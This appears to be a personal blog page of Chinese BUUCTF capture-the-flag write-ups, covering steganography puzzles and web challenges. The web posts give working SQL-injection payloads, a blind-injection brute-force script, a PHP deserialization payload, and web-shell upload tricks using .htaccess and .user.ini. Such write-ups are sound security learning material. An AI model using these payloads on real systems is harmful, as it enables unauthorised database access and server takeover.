<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>qinyiwen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="qinyiwen">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="qinyiwen">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qinyiwen</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Buuctf Misc（2-5）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-14T11:40:16.000Z" itemprop="datePublished">2023-08-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/">Buuctf Misc（2-5）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Misc（2-5）"><a href="#Buuctf-Misc（2-5）" class="headerlink" title="Buuctf Misc（2-5）"></a>Buuctf Misc（2-5）</h3><h4 id="2、金三胖"><a href="#2、金三胖" class="headerlink" title="2、金三胖"></a>2、金三胖</h4><p>下载得到一个动图</p>
<p>使用Stegsolve逐帧查看</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22ec8c35-3e0c-4728-9610-11900be31d5e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7e0a30aa-f5c9-455e-bf87-8a8ddce67c31" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/229d2aef-b25c-484c-970e-e283d44619e4" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11ohongke&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、你竟然赶我走"><a href="#3、你竟然赶我走" class="headerlink" title="3、你竟然赶我走"></a>3、你竟然赶我走</h4><p>得到一张jpg图片</p>
<p>用Stegsolve打开</p>
<p>Analyse-File Format得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bf264ab0-599e-4e00-9b5e-153948df73a9" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;stego_is_s0_bor1ing&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、二维码"><a href="#4、二维码" class="headerlink" title="4、二维码"></a>4、二维码</h4><p>扫描二维码，得到secret is here</p>
<p>先将png图片更改后缀转为txt文件，发现了4number.txt，还有一些PK值，c猜测隐藏了一个zip压缩包(zip的创始人名字简写为PK)和4number.txt文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/50cff623-01bd-4cb5-99e4-8b53e265afa7" alt="image"></p>
<p>将后缀改为zip格式，用压缩软件能打开，并且发现一个4number.txt文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b36ccdc5-e944-4957-8636-c08181239269" alt="image"></p>
<p>双击4number.txt，需要解压密码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/81a48217-c53d-4a9d-95e8-8c54209957bc" alt="image"></p>
<p>爆破，得到密码7639，解密得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8336589-a3e3-4052-a660-2b2639967d45" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;vjpw_wnoei&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5、大白"><a href="#5、大白" class="headerlink" title="5、大白"></a>5、大白</h4><p>根据题目提示，用010 Editor打开图像</p>
<p>修改图像高度，与宽度一致</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/34c3a8ff-ef67-4e81-b865-fc64c46eac05" alt="image"></p>
<p>保存，查看图像，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/346bccbc-ef45-4667-9f7a-a8e8f00772a5" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;He1l0_d4_ba1&#125;</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/" data-id="cllcagtdd0000nkvfc45jeysl" data-title="Buuctf Misc（2-5）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（29-32）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-13T11:17:08.000Z" itemprop="datePublished">2023-08-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/">Buuctf Web（29-32）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（29-32）"><a href="#Buuctf-Web（29-32）" class="headerlink" title="Buuctf Web（29-32）"></a>Buuctf Web（29-32）</h3><h4 id="29、BabyUpload"><a href="#29、BabyUpload" class="headerlink" title="29、BabyUpload"></a>29、BabyUpload</h4><p>上传木马文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f1cdf73f-54fb-4c8a-854e-4e53e534ca69" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ecc9a7dc-9df4-4e7f-ba50-7e1968b6706d" alt="image"></p>
<p>抓包，把Content-Type改成image&#x2F;jpeg，send，上传成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7f2757c3-b6fb-4e0e-b663-7b9cc9b02b91" alt="image"></p>
<p>文件解析漏洞（.htaccess）</p>
<p>再上传一个文件.htaccess，用于把我们改成上传的1.png转换成php执行的文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.htaccess是什么</span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line"></span><br><span class="line">笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br><span class="line"></span><br><span class="line">来源网站：https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6be00b40-a2b8-49df-ba16-980b16e79a02" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815191917070.png" alt="image-20230815191917070"></p>
<p>剑蚁连接</p>
<p>url：<code>http://954cf8be-bbf5-4eae-b98c-8ec3134ab480.node4.buuoj.cn:81/upload/eb1fdce4f69ef7dbee3449f34d370e48/1.png</code></p>
<p>密码：<code>zyh</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/05eab8aa-52f7-4bb4-aebf-cbe359d4082c" alt="image"></p>
<p>测试连接，连接成功，添加</p>
<p>右键单击，文件管理，可以看见刚刚上传的两个文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e79aac52-8dab-4030-91ed-92bca059cc12" alt="image"></p>
<p>到根目录可以看到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8197267a-a353-4dae-a72f-d1f94e8f7c37" alt="image"></p>
<p>双击得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c304cd3b-a35e-44a6-9f55-958580fc1518" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;311e55a5-2d17-4918-bc47-3bd56396cb65&#125;</span><br></pre></td></tr></table></figure>

<h4 id="30、BabySQli"><a href="#30、BabySQli" class="headerlink" title="30、BabySQli"></a>30、BabySQli</h4><p>随便输入，然后登录</p>
<p>跳转到了search.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2fa84c35-8f03-4b6b-87a3-3ce5671f25ea" alt="image"></p>
<p>查看源代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/11ef7be2-be51-4eb3-9f62-68be8e026f96" alt="image"></p>
<p>第一行有一串加密的字符，base32+base64解密</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5344e371-2eae-4ebe-88d0-808aac8a6159" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8767f15a-a1bf-4bce-90cf-c82d0aef5658" alt="image"></p>
<p>得到：select * from user where username &#x3D; ‘$name’</p>
<p>存在一个admin用户，当name&#x3D;admin时回显不是user error而是pass error</p>
<p>这里的验证方式是将name带入查询再将查询后的密码与输入进行比对。经过常规注入手段我们发现这里有三个字段</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b566e44-f2c4-4d8e-8530-0d37720d5c19" alt="image"></p>
<p>爆字段数：<code>name=admin&#39; Order by 3 #&amp;pw=1</code>——注意：这里的or被过滤，使用大小写绕过</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cb12cb04-56cd-415b-87cc-18d95c29ef60" alt="image"></p>
<p>经测试admin在第二字段</p>
<p>union联合查询在查询不存在的数据时，会创建一个临时数据，然后返回这个临时数据union select 1,2,3，返回数据就为column1：1，column2：2，column3：3。我们可以根据这个特性来猜测user字段的位置。经过猜测我们发现admin在2的位置。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/88ea1742-4cf7-464c-8908-2e2ccf5a3806" alt="image"></p>
<p>猜测3的位置应该就是pass字段并且这里pass应该存储的是MD5值，将123进行MD5加密放到3的位置，这时union select, 1,admin,‘md5(123)’,的返回数据为column1：1，column2：admin，column3：md5(123),并且将返回的md5(123)，与我们输入的pass的md5值进行比对如果一样则会登陆成功。</p>
<p>payload：<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #&amp;pw=123</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/95926219-75e6-4520-9328-ae5faac7a8e8" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ee2e0a88-2e24-42a8-aca4-82df10b46a95&#125; </span><br></pre></td></tr></table></figure>

<h4 id="31、Blacklist"><a href="#31、Blacklist" class="headerlink" title="31、Blacklist"></a>31、Blacklist</h4><p><strong>堆叠注入+HANDLER</strong></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0de45253-1013-4318-af8f-e0f11fe1217f" alt="image"></p>
<p><code>1&#39;;show databases;#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a9be4a9b-169b-4e41-93f8-0914fac694f2" alt="image"></p>
<p><code>1&#39;;show tables;#</code></p>
<p>看到了FlagHere</p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230815165542275.png" alt="image-20230815165542275"></p>
<p><code>1&#39;; show columns from FlagHere;#</code></p>
<p>看到了flag字段</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b4ae33e-efd4-42ba-b3f2-11a4810f961a" alt="image"></p>
<p>大佬的方法</p>
<p>HANDLER OPEN语句打开一个表，使其可以使用后续HANDLER READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER CLOSE或会话终止之前不会关闭</p>
<p><code>1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f0968b-1747-4462-bb65-a5c23a4c7e37" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a23e0fdb-6350-412e-9f51-b021e9d5956e&#125;</span><br></pre></td></tr></table></figure>

<h4 id="32、Hack-World"><a href="#32、Hack-World" class="headerlink" title="32、Hack World"></a>32、Hack World</h4><p>显示了一些常见的SQL字符，很多都被过滤了</p>
<p>但还有<code>()</code>字符没被过滤，我们使用<code>()</code>代替空格，而且题目提示flag在flag表的flag字段中</p>
<p>使用脚本爆破</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># Author: mochu7</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def blind_injection(url):</span><br><span class="line">	flag = &#x27;&#x27;</span><br><span class="line">	strings = string.printable</span><br><span class="line">	for num in range(1,60):</span><br><span class="line">		for i in strings:</span><br><span class="line">			payload = &#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;.format(num,ord(i))#format函数设置指定位置&#123;0&#125;&#123;1&#125;</span><br><span class="line">			post_data = &#123;&quot;id&quot;:payload&#125;</span><br><span class="line">			res = requests.post(url=url,data=post_data)</span><br><span class="line">			if &#x27;Hello&#x27; in res.text:</span><br><span class="line">				flag += i</span><br><span class="line">				print(str(num)+&#x27;:&#x27;+flag)</span><br><span class="line">			else:</span><br><span class="line">				continue</span><br><span class="line">	print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	url = &#x27;http://f3973461-b610-4d3c-aebe-b5c7fba25e38.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">	blind_injection(url)</span><br></pre></td></tr></table></figure>

<p>运行得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9b6e604a-e507-4a25-991d-a01bf7e783ee" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fbc1a128-737d-4d89-9b9d-fad374bbef13&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/" data-id="cllcagtdl0001nkvfe1u11sdt" data-title="Buuctf Web（29-32）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（25-28）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-12T12:53:48.000Z" itemprop="datePublished">2023-08-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（25-28）"><a href="#Buuctf-Web（25-28）" class="headerlink" title="Buuctf Web（25-28）"></a>Buuctf Web（25-28）</h3><h4 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h4><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>

<p>输入用户名：<code>1</code></p>
<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
<p>出现这段话，并且url加上了&#x2F;check.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
<p>geek</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
<p>H4rDsq1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
<p>id,username,password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
<p>flag{52272770-1ba7-4986-8a7d-cb</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
<p>7-4986-8a7d-cb84363e2987}</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>

<h4 id="26、Ez-bypass"><a href="#26、Ez-bypass" class="headerlink" title="26、Ez_bypass"></a>26、Ez_bypass</h4><p>这是一段php代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6025af10-9590-4393-a0ae-93aa16f18a7a" alt="image"></p>
<p>查看源码，得到易读的格式</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3be50c4c-0313-43b5-92a2-760dd9124563" alt="image"></p>
<p>分析代码</p>
<p>第一步</p>
<p>首先用get方式传入id和gg</p>
<p><code>md5($id)===md5($gg)</code>数组绕过：id[]&#x3D;a&amp;gg[]&#x3D;b，最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p>
<p>构造payload：<code>/?id[]=a&amp;gg[]=b</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8cce0fe7-5a49-4fef-8dc9-e6bc1d8a1d22" alt="image"></p>
<p> 第二步</p>
<p>用post方法传入passwd，passwd不是数字和数字字符串，但是passwd值为1234567</p>
<p><code>is_numeric() </code>用于检测变量是否为数字或数字字符串</p>
<p>所以passwd为1234567a</p>
<p>用插件实现post传参</p>
<p>构造payload：<code>passwd=1234567a</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b387b0b-34b7-47d7-a4f3-da0541b41645" alt="image"></p>
<p>关于md5的总结<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52923241/article/details/119669647">【CTF】关于md5总结_ctf md5_吃_早餐的博客-CSDN博客</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e2f8945c-0443-493c-8023-304121617ba8&#125;</span><br></pre></td></tr></table></figure>

<h4 id="27、AreUSerialz"><a href="#27、AreUSerialz" class="headerlink" title="27、AreUSerialz"></a>27、AreUSerialz</h4><p>代码审计：op变量使用强类型比较&#x3D;&#x3D;&#x3D;判断this-&gt;op的值是否等于字符串2，如果等于，则将其置为1。在process()方法中，使用弱类型比较&#x3D;&#x3D;判断op的值是否对等于字符串2，若为真，则执行read()方法与output()方法。在read()方法中，使用file_get_contents()函数来读取属性filename路径的文件。</p>
<p>编造序列化（利用public属性序列化，绕过is_valid()函数）</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new FileHandler();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到序列化结果为</p>
<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code><br><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca844239-9ab4-495a-8dca-990e712adf01" alt="image"></p>
<p>构造payload：<code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>得到一串base64编码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/15c04760-6a23-41d4-83f6-dd8f478eb394" alt="image"></p>
<p>解码后得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5a5854bd-3fac-4eec-b1ea-540fcfeaebae" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0f854947-b236-49a6-ae66-d96e523aa8ca&#125;</span><br></pre></td></tr></table></figure>

<h4 id="28、CheckIn"><a href="#28、CheckIn" class="headerlink" title="28、CheckIn"></a>28、CheckIn</h4><p>user.ini文件构成PHP后门</p>
<p>创建<code>.user.ini</code>文件，前面的<code>GIF</code>是为了绕过检测；因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d95f340e-38ae-4031-822c-3f6235148810" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f9af52b5-a67d-4af4-8823-27f73a90f669" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57a89ea6-4ffd-4e14-8ef8-06719fe30248" alt="image"></p>
<p>创建图片文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/71797466-704f-4582-ba9e-97f28a1b3f74" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8781da91-2795-4230-ac17-57b131e21631" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6c0d5cd1-1472-4e3a-9a9d-da5b8e7d3325" alt="image"></p>
<p>蚁剑链接<code>http://3b30b477-b314-466c-bb51-8e982490eea3.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php</code></p>
<p>试了很久返回数据为空，不知道怎么解决</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" data-id="cllavjvho0000t8vf6bgrh8c3" data-title="Buuctf Web（25-28）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（21-24）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-11T11:44:06.000Z" itemprop="datePublished">2023-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
    </h1>
  

      </header>
    
